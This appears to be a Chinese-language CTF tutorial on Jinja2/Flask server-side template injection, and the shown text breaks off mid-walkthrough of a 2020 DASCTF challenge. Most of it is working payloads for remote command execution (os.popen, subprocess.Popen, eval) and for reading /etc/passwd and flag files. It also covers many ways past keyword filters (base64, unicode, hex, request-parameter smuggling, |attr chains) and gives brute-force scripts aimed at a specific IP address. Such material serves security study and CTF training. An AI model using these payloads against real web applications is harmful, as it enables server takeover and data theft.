import requestsif __name__ == &#x27;__main__&#x27;:    post_url = &#x27;http://124.70.99.199:10086/level/1&#x27;    for i in range(300):        data = &#123;            &#x27;code&#x27;:&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;        &#125;        res = requests.post(post_url, data = data)        if &#x27;linecache&#x27; in res.text:            print(i, &quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;)        else:            print(i, res.text, res.status_code, &quot;NO&quot;)

构造payload：&#123;&#123;[].__class__.__base__.__subclasses__()[284].__init__.__globals__['linecache']['os'].popen('ls /').read()&#125;&#125;
寻找 subprocess.Popen 类执行命令从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。
subprocess 意在替代其他几个老的模块或者函数，比如：os.system、os.popen 等函数。
首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：
import requestsif __name__ == &#x27;__main__&#x27;:    post_url = &#x27;http://124.70.99.199:10086/level/1&#x27;    for i in range(500,550):        data = &#123;            &#x27;code&#x27;:&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&quot;        &#125;        res = requests.post(post_url, data = data)        if &#x27;subprocess.Popen&#x27; in res.text:            print(i, &quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;)        else:            print(i, res.text, res.status_code, &quot;NO&quot;)

构造payload：&#123;&#123;[].__class__.__base__.__subclasses__()[520]('ls /',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;
关键字绕过利用字符串拼接绕过我们可以利用“**+**”进行字符串拼接，绕过关键字过滤，例如：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&#x27;/fl&#x27;+&#x27;ag&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;o&quot;+&quot;s&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__buil&#x27;+&#x27;tins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

只要返回的是字典类型的或是字符串格式的，即payload中引号内的，在调用的时候都可以使用字符串拼接绕过。
利用编码绕过我们可以利用对关键字编码的方法，绕过关键字过滤，例如用base64编码绕过：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;X19idWlsdGluc19f&#x27;.decode(&#x27;base64&#x27;)][&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&#x27;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#x27;.decode(&#x27;base64&#x27;))&#125;&#125;

等同于：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用编码绕过。同理还可以进行rot13、16进制编码等。
利用Unicode编码绕过关键字（flask适用）我们可以利用unicode编码的方法，绕过关键字过滤，例如：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;][&#x27;\u0065\u0076\u0061\u006c&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;\u006f\u0073&#x27;].popen(&#x27;\u006c\u0073\u0020\u002f&#x27;).read()&#125;&#125;

等同于：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;

利用Hex编码绕过关键字和上面那个一样，只不过将Unicode编码换成了Hex编码，适用于过滤了“u”的情况。
我们可以利用hex编码的方法，绕过关键字过滤，例如：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;][&#x27;\x65\x76\x61\x6c&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;\x6f\x73&#x27;].popen(&#x27;\x6c\x73\x20\x2f&#x27;).read()&#125;&#125;

等同于：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;

利用引号绕过我们可以利用引号来绕过对关键字的过滤。例如，过滤了flag，那么我们可以用 fl&quot;&quot;ag 或 fl&#39;&#39;ag 的形式来绕过：
[].__class__.__base__.__subclasses__()[40](&quot;/fl&quot;&quot;ag&quot;).read()

再如：
().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;o&#x27;&#x27;s&#x27;].popen(&#x27;ls&#x27;).read()&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__buil&#x27;&#x27;tins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用引号绕过。
利用join()函数绕过我们可以利用join()函数来绕过关键字过滤。例如，题目过滤了flag，那么我们可以用如下方法绕过：
[].__class__.__base__.__subclasses__()[40](&quot;fla&quot;.join(&quot;/g&quot;)).read()

绕过其他字符过滤了中括号[ ]利用 __getitem__() 绕过
可以使用 __getitem__() 方法输出序列属性中的某个索引处的元素，如：
&quot;&quot;.__class__.__mro__[2]&quot;&quot;.__class__.__mro__.__getitem__(2)[&#x27;__builtins__&#x27;].__getitem__(&#x27;eval&#x27;)

如下示例：
&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;       // 指定序列属性&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;       // 指定字典属性

利用 pop() 绕过
pop()方法可以返回指定序列属性中的某个索引处的元素或指定字典属性中某个键对应的值，如下示例：
&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;       // 指定序列属性&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop(&#x27;__builtins__&#x27;).pop(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;       // 指定字典属性

注意：最好不要用pop()，因为pop()会删除相应位置的值。（除非你有相应的权限才可以）
利用字典读取绕过
我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 [] 里来访问，一种就是用点 . 来访问。所以，当方括号 [] 被过滤之后，我们还可以用点 . 的方式来访问，如下示例
// __builtins__.eval()&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

等同于：
// [__builtins__][&#x27;eval&#x27;]()&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

过滤了引号利用chr()绕过
先获取chr()函数，赋值给chr，后面再拼接成一个字符串
&#123;% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()&#125;&#125;# &#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()&#125;&#125;

等同于
&#123;&#123;().__class__.__bases__[0].__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;

利用request对象绕过
示例：
&#123;&#123;().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd（只能get）&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.values.cmd).read()&#125;&#125;&amp;os=os&amp;cmd=ls /（get/post都可以）

等同于：
&#123;&#123;().__class__.__bases__[0].__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;

如果过滤了args，可以将其中的request.args改为request.values，POST和GET两种方法传递的数据request.values都可以接收
过滤了下划线__利用request对象绕过
&#123;&#123;()[request.args.class][request.args.bases][0][request.args.subclasses]()[40](&#x27;/flag&#x27;).read()&#125;&#125;&amp;class=__class__&amp;bases=__bases__&amp;subclasses=__subclasses__&#123;&#123;()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;&amp;class=__class__&amp;bases=__bases__&amp;subclasses=__subclasses__

等同于：
&#123;&#123;().__class__.__bases__[0].__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;

还有一种编码绕过
__class__ =&gt; \x5f\x5fclass\x5f\x5f

其中_的十六进制编码为\x5f，于是我们可以构造出如下的payload：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[154].__init__.__globals__[&#x27;popen&#x27;](&quot;ls /&quot;).read()&#125;&#125;

&#123;&#123;()|attr(&quot;\x5f\x5fclass\x5f\x5f&quot;)|attr(&quot;\x5f\x5fbase\x5f\x5f&quot;)|attr(&quot;\x5f\x5fsubclasses\x5f\x5f&quot;)()|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(154)|attr(&quot;\x5f\x5finit\x5f\x5f&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&#x27;popen&#x27;)(&quot;ls /&quot;)|attr(&quot;read&quot;)()&#125;&#125;

过滤了点 .利用 |attr() 绕过（适用于flask）
如果 . 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数attr()，即：
().__class__   =&gt;  ()|attr(&quot;__class__&quot;)

示例：
&#123;&#123;()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(77)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls /&quot;)|attr(&quot;read&quot;)()&#125;&#125;

等同于：
&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;

利用中括号[ ]绕过
如下示例：
&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__bases__&#x27;][0][&#x27;__subclasses__&#x27;]()[59][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)&#125;&#125;

等同于：
&#123;&#123;().__class__.__bases__.[0].__subclasses__().[59].__init__[&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;].eval(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

这样的话，那么 __class__、__bases__ 等关键字就成了字符串，就都可以用前面所讲的关键字绕过的姿势进行绕过了。
&#123;&#123;().__class__.__bases__[0].__subclasses__()[158].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;&#123;&#123;()[&#x27;__class__&#x27;][&#x27;__bases__&#x27;][0][&#x27;__subclasses__&#x27;][158][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;)[popen(&quot;ls /&quot;)][read()]&#x27;)&#125;&#125;

过滤了大括号可以使用 &#123;% if ... %&#125;1&#123;% endif %&#125; 配合 os.popen 和 curl 将执行结果外带（不外带的话无回显）出来：
&#123;% if &#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;ls /&#x27;) %&#125;1&#123;% endif %&#125;

也可以用 &#123;%print(......)%&#125; 的形式来代替大括号，如下：
&#123;%print(&#x27;&#x27;.__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read())%&#125;

利用 |attr() 来Bypass这里说一个新东西，就是原生JinJa2函数 attr()，这是一个 attr() 过滤器，它只查找属性，获取并返回对象的属性的值，过滤器与变量用管道符号（ | ）分割。如：
foo|attr(&quot;bar&quot;)   等同于   foo[&quot;bar&quot;]

|attr() 配合其他姿势可同时绕过双下划线 __ 、引号、点 . 和 [ 等，下面给出示例。
同时过滤了 . 和 []过滤了以下字符：.    [
绕过姿势：
&#123;&#123;()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(77)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()&#125;&#125;

等同于：
&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;

同时过滤了 __ 、点. 和 []过滤了以下字符：
__    .    [    &quot;

下面我们演示绕过姿势，先写出payload的原型：
&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

由于中括号 [ 被过滤了，我们可以用 __getitem__() 来绕过（尽量不要用pop()），类似如下：
&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(77).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

由于还过滤了下划线 __，我们可以用request对象绕过，但是还过滤了中括号 []，所以我们要同时绕过 __ 和 [，就用到了我们的|attr()
所以最终的payload如下：
&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;ls /&#x27;).read()

同时过滤了 __ 、点. 和 []过滤了以下字符：
__    .    [    &quot;

下面我们演示绕过姿势，先写出payload的原型：
&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

由于中括号 [ 被过滤了，我们可以用 __getitem__() 来绕过（尽量不要用pop()），类似如下：
&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(77).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

由于还过滤了下划线 __，我们可以用request对象绕过，但是还过滤了中括号 []，所以我们要同时绕过 __ 和 [，就用到了我们的|attr()
所以最终的payload如下：
&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;ls /&#x27;).read()

用Unicode编码配合 |attr() 进行Bypass过滤了以下字符：
&#x27;  request  &#123;&#123;  _  %20(空格)  [  ]  .  __globals__   __getitem__

我们用 &#123;%print(......)%&#125;绕过对 &#123;&#123;` 的过滤，并用unicode绕过对关键字的过滤。unicode绕过是一种网上没提出的方法。

假设我们要构造的payload原型为：

&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;

先用 `|attr` 绕过 `.` 和 `[]`：

&#123;&#123;()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(77)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()&#125;&#125;

我们可以将过滤掉的字符用unicode替换掉：

&#123;&#123;()|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(77)|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()&#125;&#125;

### 用Hex编码配合 `|attr()` 进行Bypass

和上面那个一样，只不过是将Unicode编码换成了Hex编码，适用于“u”被过滤了的情况。

我们可以将过滤掉的字符用Hex编码替换掉：

&#123;&#123;()|attr(&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;)()|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(258)|attr(&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat\x20\x66\x6c\x61\x67\x2e\x74\x78\x74&quot;)|attr(&quot;read&quot;)()&#125;&#125;

## 使用 JinJa 的过滤器进行Bypass

在 Flask JinJa 中，内只有很多过滤器可以使用，前文的attr()就是其中的一个过滤器。变量可以通过过滤器进行修改，过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号（|）连接多个过滤器，一个过滤器的输出应用于下一个过滤器。

详情请看官方文档：https://jinja.palletsprojects.com/en/master/templates/#builtin-filters

以下是内置的所有的过滤器列表：

| [`abs()`](https://jinja.palletsprojects.com/en/master/templates/#abs) | [`float()`](https://jinja.palletsprojects.com/en/master/templates/#float) | [`lower()`](https://jinja.palletsprojects.com/en/master/templates/#lower) | [`round()`](https://jinja.palletsprojects.com/en/master/templates/#round) | [`tojson()`](https://jinja.palletsprojects.com/en/master/templates/#tojson) |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| [`attr()`](https://jinja.palletsprojects.com/en/master/templates/#attr) | [`forceescape()`](https://jinja.palletsprojects.com/en/master/templates/#forceescape) | [`map()`](https://jinja.palletsprojects.com/en/master/templates/#map) | [`safe()`](https://jinja.palletsprojects.com/en/master/templates/#safe) | [`trim()`](https://jinja.palletsprojects.com/en/master/templates/#trim) |
| [`batch()`](https://jinja.palletsprojects.com/en/master/templates/#batch) | [`format()`](https://jinja.palletsprojects.com/en/master/templates/#format) | [`max()`](https://jinja.palletsprojects.com/en/master/templates/#max) | [`select()`](https://jinja.palletsprojects.com/en/master/templates/#select) | [`truncate()`](https://jinja.palletsprojects.com/en/master/templates/#truncate) |
| [`capitalize()`](https://jinja.palletsprojects.com/en/master/templates/#capitalize) | [`groupby()`](https://jinja.palletsprojects.com/en/master/templates/#groupby) | [`min()`](https://jinja.palletsprojects.com/en/master/templates/#min) | [`selectattr()`](https://jinja.palletsprojects.com/en/master/templates/#selectattr) | [`unique()`](https://jinja.palletsprojects.com/en/master/templates/#unique) |
| [`center()`](https://jinja.palletsprojects.com/en/master/templates/#center) | [`indent()`](https://jinja.palletsprojects.com/en/master/templates/#indent) | [`pprint()`](https://jinja.palletsprojects.com/en/master/templates/#pprint) | [`slice()`](https://jinja.palletsprojects.com/en/master/templates/#slice) | [`upper()`](https://jinja.palletsprojects.com/en/master/templates/#upper) |
| [`default()`](https://jinja.palletsprojects.com/en/master/templates/#default) | [`int()`](https://jinja.palletsprojects.com/en/master/templates/#int) | [`random()`](https://jinja.palletsprojects.com/en/master/templates/#random) | [`sort()`](https://jinja.palletsprojects.com/en/master/templates/#sort) | [`urlencode()`](https://jinja.palletsprojects.com/en/master/templates/#urlencode) |
| [`dictsort()`](https://jinja.palletsprojects.com/en/master/templates/#dictsort) | [`join()`](https://jinja.palletsprojects.com/en/master/templates/#join) | [`reject()`](https://jinja.palletsprojects.com/en/master/templates/#reject) | [`string()`](https://jinja.palletsprojects.com/en/master/templates/#string) | [`urlize()`](https://jinja.palletsprojects.com/en/master/templates/#urlize) |
| [`escape()`](https://jinja.palletsprojects.com/en/master/templates/#escape) | [`last()`](https://jinja.palletsprojects.com/en/master/templates/#last) | [`rejectattr()`](https://jinja.palletsprojects.com/en/master/templates/#rejectattr) | [`striptags()`](https://jinja.palletsprojects.com/en/master/templates/#striptags) | [`wordcount()`](https://jinja.palletsprojects.com/en/master/templates/#wordcount) |
| [`filesizeformat()`](https://jinja.palletsprojects.com/en/master/templates/#filesizeformat) | [`length()`](https://jinja.palletsprojects.com/en/master/templates/#length) | [`replace()`](https://jinja.palletsprojects.com/en/master/templates/#replace) | [`sum()`](https://jinja.palletsprojects.com/en/master/templates/#sum) | [`wordwrap()`](https://jinja.palletsprojects.com/en/master/templates/#wordwrap) |
| [`first()`](https://jinja.palletsprojects.com/en/master/templates/#first) | [`list()`](https://jinja.palletsprojects.com/en/master/templates/#list) | [`reverse()`](https://jinja.palletsprojects.com/en/master/templates/#reverse) | [`title()`](https://jinja.palletsprojects.com/en/master/templates/#title) | [`xmlattr()`](https://jinja.palletsprojects.com/en/master/templates/#xmlattr) |

可以自行点击每个过滤器去查看每一种过滤器的作用。我们就是利用这些过滤器，一步步的拼接出我们想要的字符、数字或字符串。

### 常用字符获取入口点

- 对于获取一般字符的方法有以下几种：

&#123;% set org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;&#123;% set org = (self|string()) %&#125;&#123;&#123;org&#125;&#125;&#123;% set org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;&#123;% set org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;

如下演示：

&#123;% set org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;

可以通过上面获取到的 `` 字符串获取的字符有：尖号、字母、空格、下划线和数字。

&#123;% set org = (self|string()) %&#125;&#123;&#123;org&#125;&#125;

如上图所示，可以通过 `` 字符串获取的字符有：尖号、字母和空格。

&#123;% set org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;

可以通过上面获取到的除了字母以外还有百分号，这一点比较重要，因为如果我们控制了百分号的话我们可以获取任意字符

&#123;% set org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;

可获得到的字符更多了。

- 对于获取数字，除了上面出现的那几种外我们还可以有以下几种方法：

&#123;% set num = (self|int) %&#125;&#123;&#123;num&#125;&#125;    # 0, 通过int过滤器获取数字&#123;% set num = (self|string|length) %&#125;&#123;&#123;num&#125;&#125;    # 24, 通过length过滤器获取数字&#123;% set point = self|float|string|min %&#125;    # 通过float过滤器获取点 .&#123;% set num = (True|int) %&#125;         #得到1

比如：`code=&#123;% set a='aaaaaaaaaaa'|length*'aa'|length*'aaaaaaa'|length %&#125;&#123;&#123;a&#125;&#125;得到154
有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算。
[2020 DASCTF 八月安恒月赛]ezflask题目源码：
#!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directoryapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    def safe_jinja(s):        blacklist = [&#x27;class&#x27;, &#x27;attr&#x27;, &#x27;mro&#x27;, &#x27;base&#x27;,                     &#x27;request&#x27;, &#x27;session&#x27;, &#x27;+&#x27;, &#x27;add&#x27;, &#x27;chr&#x27;, &#x27;ord&#x27;, &#x27;redirect&#x27;, &#x27;url_for&#x27;, &#x27;config&#x27;, &#x27;builtins&#x27;, &#x27;get_flashed_messages&#x27;, &#x27;get&#x27;, &#x27;subclasses&#x27;, &#x27;form&#x27;, &#x27;cookies&#x27;, &#x27;headers&#x27;, &#x27;[&#x27;, &#x27;]&#x27;, &#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;&#123;&#125;&#x27;]        flag = True        for no in blacklist:            if no.lower() in s.lower():                flag = False                break        return flag    if not request.args.get(&#x27;name&#x27;):        return open(__file__).read()    elif safe_jinja(request.args.get(&#x27;name&#x27;)):        name = request.args.get(&#x27;name&#x27;)    else:        name = &#x27;wendell&#x27;    template = &#x27;&#x27;&#x27;    &lt;div class=&quot;center-content&quot;&gt;        &lt;p&gt;Hello, %s&lt;/p&gt;    &lt;/div&gt;    &lt;!--flag in /flag--&gt;    &lt;!--python3.8--&gt;&#x27;&#x27;&#x27; % (name)    return render_template_string(template)if __name__ == &quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)

可以看到题目过滤的死死地，最关键是把attr也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。
在存在ssti的地方执行如下payload：
&#123;% set org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;# 或 &#123;% set org = (&#123; &#125;|select|string) %&#125;&#123;&#123;org&#125;&#125;


可以看到，我们得到了一段字符串：&lt;generator object select_or_reject at 0x7f06771f4150&gt;，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 &lt;generator object select_or_reject at 0x7f06771f4150&gt; 这个字符串中取到我们想要的字符，从而绕过过滤。
然后我们在使用list()过滤器将字符串转化为列表：
&#123;% set orglst = (&#123; &#125;|select|string|list) %&#125;&#123;&#123;orglst&#125;&#125;


如上图所示，反回了一个列表，列表中是 &lt;generator object select_or_reject at 0x7f06771f4150&gt; 这个字符串的每一个字符。接下来我们便可以使用使用pop()等方法将列表里的字符取出来了。如下所示，我们取一个下划线 _：
&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;&#123;xhx&#125;&#125;    # _


同理还能取到更多的字符：
